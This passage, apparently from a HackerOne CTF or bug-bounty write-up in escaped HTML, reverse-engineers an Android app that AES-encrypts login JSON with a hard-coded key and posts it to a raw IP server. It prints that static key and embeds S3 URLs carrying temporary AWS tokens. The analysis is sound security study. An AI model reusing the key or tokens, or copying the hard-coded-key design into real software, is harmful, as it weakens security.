class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eVolley\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enewRequestQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eContext\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e)));\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt basically creates a JSON object with the username and password we enter, along with \u003ccode\u003e\u0026quot;cmd\u0026quot; : \u0026quot;getTemp\u0026quot;\u003c/code\u003e. It then creates a new PayloadRequest object and adds it to the request queue.\u003c/p\u003e\n\n\u003cp\u003eThe PayloadRequest class is even more interesting...\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_202.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/420/bc609ad76fcec9c219c5f7f94422a3a3fc5fa764/Selection_202.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_202.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_202.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8d4724efc003e6cef32eaf7aeebefbbc58a2b45c2a6245fb05a13cd087cd8000\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/420/bc609ad76fcec9c219c5f7f94422a3a3fc5fa764/Selection_202.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_202.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_202.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=8d4724efc003e6cef32eaf7aeebefbbc58a2b45c2a6245fb05a13cd087cd8000\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe main thing happens in \u003ccode\u003eBuildPayload\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003earray2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e11\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e13\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003earray2\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray3\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray3\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejsonObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray4\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray3\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eencodeToString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earray4\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt basically encrypts our JSON object (stringified) using AES-CBC with a static key and a randomly generated IV. It then prepends the IV to the encrypted string (for decryption) and base64 encodes it.\u003c/p\u003e\n\n\u003cp\u003eA POST request is sent with the encrypted JSON in the \u003ccode\u003ed\u003c/code\u003e parameter to \u003ccode\u003ehttp://35.243.186.41/\u003c/code\u003e, according to the constructor:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    public PayloadRequest(final JSONObject jsonObject, final Response$Listener mListener) {\n        super(1, \u0026quot;http://35.243.186.41/\u0026quot;, new PayloadRequest$1(mListener));\n        this.mListener = mListener;\n        (this.mParams = new HashMap()).put(\u0026quot;d\u0026quot;, this.buildPayload(jsonObject));\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe response is also encrypted, as the \u003ccode\u003eparseNetworkResponse\u003c/code\u003e function tries to decrypt it\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003eprotected\u003c/span\u003e \u003cspan class=\"nc\"\u003eResponse\u003c/span\u003e \u003cspan class=\"nf\"\u003eparseNetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eNetworkResponse\u003c/span\u003e \u003cspan class=\"n\"\u003enetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edecode\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earray\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan 